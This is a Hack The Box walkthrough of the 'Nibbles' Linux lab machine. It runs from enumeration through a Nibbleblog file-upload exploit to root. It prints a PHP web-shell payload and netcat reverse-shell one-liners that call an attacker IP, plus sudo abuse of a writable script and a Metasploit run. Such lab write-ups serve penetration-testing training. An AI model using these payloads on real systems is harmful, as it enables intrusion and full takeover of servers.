# Machine 1: Nibbles

| Machine Name          | Nibbles                                                      |
| --------------------- | ------------------------------------------------------------ |
| Creator               | mrb3n                                                        |
| OS                    | Linux                                                        |
| Difficulty            | Easy                                                         |
| User Path             | Web                                                          |
| Privilege  Escalation | World-writable File / Sudoers Misconfiguration               |
| IppsecVideo           | [Ippsec](https://www.youtube.com/watch?v=s_0GcRGv6Ds)        |
| Walkthrough           | [Walkthrough](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html) |



[TOC]

## Enumeration: Nmap

Our first step when approaching any machine is to perform some basic enumeration.

Let us begin with a quick nmap scan to look for open ports using the command:

```bash
nmap -sV --open -oA nibbles_initial_scan <ip address>
```

> This will run a service enumeration (-sV) scan against the default top 1,000 ports and only return open ports (--open).
>
> We will output all scan formats using -oA. This includes XML output, greppable output, and text output that may be useful to us later.

Scan Result:

| Port   | State | Service | Version                                              |
| ------ | ----- | ------- | ---------------------------------------------------- |
| 22/tcp | open  | OpenSSH | 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.18 ((Ubuntu))                       |

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

From the initial scan output, we can see that the host is likely <span style="color:blue">Ubuntu Linux</span> and exposes an <span style="color:orange">Apache web server on port 80</span> and an <span style="color:red">OpenSSH server on port 22</span>. SSH, or Secure Shell, is a protocol typically used for remote access to Linux/Unix hosts. SSH can also be used to access Windows host and is now native to Windows 10 since version 1809.

We can check which ports nmap scans for a given scan type by running a scan with no target specified, using the command

```bash
nmap -v -oG -
```

> Here we will output the greppable format to stdout with -oG - and -v for verbose output. Since no target is specified, the scan will fail but will show the ports scanned.



Before we start poking around at the open ports, we can run a full TCP port scan using the command. This will check for any services running on non-standard ports that our initial can may have missed. Since this scans all 65,535 TCP ports, it can take a long time to finish depending on the network.

```bash
nmap -p- --open -oA nibbles_full_tcp_scan <ip>
```

Using nc to do some banner grabbing confirms what nmap told us; the target is running an Apache web server and an OpenSSH server.

```bash
nc -nv 10.129.42.190 80
nc -nv 10.129.42.190 22
```

- (UNKNOWN) [10.129.164.41] 80 (http) open
- (UNKNOWN) [10.129.164.41] 22 (ssh) open
  SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2

Let's do perform an nmap script scan using the -sC flag. This flag uses the default scripts, which are listed [here](https://nmap.org/nsedoc/categories/default.html). These scripts can be intrusive, so it is always important to understand exactly how our tools work. We run the command

```bash
nmap -sC -p 22,80 -oA nibbles_script_scan <ip>
```

The script scan did not give us anything handy. Let us round out our nmap enumeration using the http-enum script, which can be used to **enumerate common web application directories**. This scan also did not uncover anything useful.

```bash
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <ip>
```

------



## Web Footprinting

We can use whatweb to try to identify the web application in use.

```bash
whatweb <ip>
```

> Returns:
>
> http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]

Checking the page source reveals an interesting comment.

![image-20220308105622494](/home/kali/Desktop/Penetration Testing/Nibbles/Screenshots/webapp_comment.png)

We can also check this with cURL

```bash
curl <ip>
```

```html
Returns:

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The HTML comment mentions a directory named nibbleblog. Let us check this with whatweb.

```bash
whatweb http://<ip>/nibbleblog
```

> http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
>
> http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

We can see some of the technologies in use such as **HTML5**, **jQuery**, and **PHP**. We can also see that the site is running **Nibbleblog**, which is a free blogging engine built using **PHP**.

Browsing to the /nibbleblog directory in Firefox, we do not see anything exciting on the main page.

A quick Google search for "nibbleblog exploit" yields this Nibblblog File Upload Vulnerability. The flaw allows an authenticated attacker to upload and execute arbitrary PHP code on the underlying web server. The Metasploit module in question works for version 4.0.3. We do not know the exact version of Nibbleblog in use yet, but it is a good bet that it is vulnerable to this. If we look at the source code of the Metasploit module, we can see that the exploit uses user-supplied credentials to authenticate the admin portal at /admin.php.

Let us use Gobuster to be thorough and check for any other accessible pages/directories.

```bash
gobuster dir -u http://<ip>/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
```

> Returns:
>
> ===============================================================
>
> Gobuster v3.0.1
>
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>
> [+] Url:            http://10.129.42.190/nibbleblog/
> [+] Threads:        10
> [+] Wordlist:       /usr/share/dirb/wordlists/common.txt
> [+] Status codes:   200,204,301,302,307,401,403
> [+] User Agent:     gobuster/3.0.1
>
> [+] Timeout:        10s
>
> 2020/12/17 00:10:47 Starting gobuster
>
> /.hta (Status: 403)
> /.htaccess (Status: 403)
> /.htpasswd (Status: 403)
> /admin (Status: 301)
> /admin.php (Status: 200)
> /content (Status: 301)
> /index.php (Status: 200)
> /languages (Status: 301)
> /plugins (Status: 301)
> /README (Status: 200)
>
> /themes (Status: 301)
>
> 2020/12/17 00:11:38 Finished

Gobuster finishes very quickly and confirms the presence of the admin.php page. We can check the README page for interesting information, such as the version number.

```bash
curl http://10.129.42.190/nibbleblog/README
```

> ====== Nibbleblog ======
> Version: v4.0.3
> Codename: Coffee
> Release date: 2014-04-01
>
> Site: http://www.nibbleblog.com
> Blog: http://blog.nibbleblog.com
> Help & Support: http://forum.nibbleblog.com
> Documentation: http://docs.nibbleblog.com
>
> ===== Social =====
>
> * Twitter: http://twitter.com/nibbleblog
> * Facebook: http://www.facebook.com/nibbleblog
> * Google+: http://google.com/+nibbleblog
>
> ===== System Requirements =====
>
> * PHP v5.2 or higher
> * PHP module - DOM
> * PHP module - SimpleXML
> * PHP module - GD
> * Directory “content” writable by Apache/PHP

So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the Metasploit module (though this could be an old README page). Nothing else interesting pops out at us. Let us check out the admin portal login page.

Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as admin:admin and admin:password, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message Nibbleblog security error - Blacklist protection.

Let us go back to our directory brute-forcing results. The 200 status codes show pages/directories that are directly accessible. The 403 status codes in the output indicate that access to these resources is forbidden. Finally, the 301 is a permanent redirect. Let us explore each of these. Browsing to nibbleblog/themes/. We can see that directory listing is enabled on the web application. Maybe we can find something interesting while poking around?

![image-20220308110702686](/home/kali/Desktop/Penetration Testing/Nibbles/Screenshots/nibbleblog_themes.png)

Browsing to nibbleblog/content shows some interesting subdirectories public, private, and tmp. Digging around for a while, we find a users.xml file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with cURL and prettify the XML output using **xmllint**.

```bash
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
Nota -s --silent:  Silent or quiet mode. Dont show progress meter or error messages.  Makes Curl mute.
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

At this point, we have a **valid username** but **no password**. Searches of Nibbleblog related documentation show that the password is set during installation, and there is **<u>no known default password</u>**. Up to this point, have the following pieces of the puzzle:

- A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability


- An admin portal at nibbleblog/admin.php

- Directory listing which confirmed that admin is a valid username


- Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as Hydra off the table.

There are no other ports open, and we did not find any other directories. Which we can confirm by performing additional directory brute-forcing against the root of the web application

```bash
gobuster dir -u http://<ip>/ --wordlist /usr/share/dirb/wordlists/common.txt
```

> Gobuster v3.0.1
>
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>
> [+] Url:            http://10.129.42.190/
> [+] Threads:        10
> [+] Wordlist:       /usr/share/dirb/wordlists/common.txt
> [+] Status codes:   200,204,301,302,307,401,403
> [+] User Agent:     gobuster/3.0.1
>
> [+] Timeout:        10s
>
> 2020/12/17 00:36:55 Starting gobuster
>
> /.hta (Status: 403)
> /.htaccess (Status: 403)
> /.htpasswd (Status: 403)
> /index.html (Status: 200)
>
> /server-status (Status: 403)
>
> 2020/12/17 00:37:46 Finished

Taking another look through all of the exposed directories, we find a config.xml file.

```bash
curl -s http://<ip>/nibbleblog/content/private/config.xml | xmllint --format -
```

```xml
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```

Checking it, hoping for passwords proofs fruitless, but we do see two mentions of nibbles in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?

When performing password cracking offline with a tool such as Hashcat or attempting to guess a password, it is important to consider all of the information in front of us. It is not uncommon to successfully crack a password hash (such as a company's wireless network passphrase) using a wordlist generated by crawling their website using a tool such as CeWL.

This shows us how crucial thorough enumeration is. Let us recap what we have found so far:

- We started with a simple nmap scan showing two open ports

- Discovered an instance of Nibbleblog

- Analyzed the technologies in use using whatweb

- Found the admin login portal page at admin.php

- Discovered that directory listing is enabled and browsed several directories

- Confirmed that admin was the valid username

- Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts

- Uncovered clues that led us to a valid admin password of nibbles

------

## Initial Foothold

Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page. Let us attempt to use this plugin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution.

```php
<?php system('id'); ?>
```

Save this code to a file and then click on the Browse button and upload it. We get a bunch of errors, but it seems like the file may have uploaded.

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the /content directory. Under this, there is a plugins directory and another subdirectory for my_image. The full path is at http://<host>/nibbleblog/content/private/plugins/my_image/. In this directory, we see two files, db.xml and image.php, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.

```bash
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```

> uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the nibbler user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.

Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).

Let us use the following Bash reverse shell one-liner and add it to our PHP script.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a netcat listener in our terminal:

```bash
nc -lvnp 9443
```

cURL the image page again or browse to it in Firefox at http:///nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.

> nabecos@htb[/htb]$ nc -lvnp 9443
>
> listening on [any] 9443 ...
> connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
> /bin/sh: 0: can't access tty; job control turned off
> $ id
>
> uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as su will not work, we cannot use text editors, tab-completion does not work, etc. Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as Python2 seems to be missing from the system! We have Python3 though, which works to get us to a friendlier shell by typing:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Browsing to /home/nibbler, we find the **user.txt flag** as well as a zip file **personal.zip**.

------

## Privilege Escalation

Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the personal.zip file and see a file called monitor.sh.

```bash
unzip personal.zip
```

The shell script monitor.sh is a monitoring script, and it is owned by our nibbler user and writeable.

Let us put this aside for now and pull in LinEnum.sh to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command:

```bash
(HOST DIRECTORY) sudo python3 -m http.server 8080
(TARGET DOWNLOAD LOCATION) wget http://<your ip>:8080/LinEnum.sh
```

Once the script is pulled over, type 

```bash
chmod +x LinEnum.sh
```

to make the script executable and then type ./LinEnum.sh to run it. We see a ton of interesting output but what immediately catches the eye are sudo privileges.

> [+] We can sudo without supplying a password!
> Matching Defaults entries for nibbler on Nibbles:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User nibbler may run the following commands on Nibbles:
>     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
>
> [+] Possible sudo pwnage!
> /home/nibbler/personal/stuff/monitor.sh

The nibbler user can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user. Let us edit the monitor.sh file to append a reverse shell one-liner.

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f' | tee -a monitor.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

If we cat the monitor.sh file, we will see the contents appended to the end. It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption. 

Execute the script with sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh 
```

Finally, catch the root shell on our waiting nc listener:

> nabecos@htb[/htb]$ nc -lvnp 8443
>
> listening on [any] 8443 ...
> connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
>
> id
>
> uid=0(root) gid=0(root) groups=0(root)

From here, we can grab the root.txt flag inside /root.

------

## Alternate User Method - Metasploit

Start Metsaploit from your attack box by typing msfconsole. Once loaded, we can search for the exploit.

> msf6 > search nibbleblog
>
> Matching Modules
>
> Name                                       Disclosure Date  Rank       Check  Description
>
> -  ----                                       ---------------  ----       -----  -----------
>
>    0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
>
>
> Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

We can then type `use 0` to load the selected exploit. Set the rhosts option as the target IP address and lhosts as the IP address of your tun0 adapter (the one that comes with the VPN connection to HackTheBox).

> msf6 > use 0
> [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
>
> msf6 exploit(multi/http/nibbleblog_file_upload) > set rhosts 10.129.42.190
> rhosts => 10.129.42.190
> msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost 10.10.14.2 
> lhost => 10.10.14.2

Type `show options` to see what other options need to be set. We need to set the admin username and password admin:nibbles and the TARGETURI to nibbleblog.

> msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
> username => admin
> msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
> password => nibbles
> msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi nibbleblog
> targeturi => nibbleblog

We also need to change the payload type. For our purposes let's go with generic/shell_reverse_tcp => `set payload generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.

From here, we can follow the same privilege escalation path.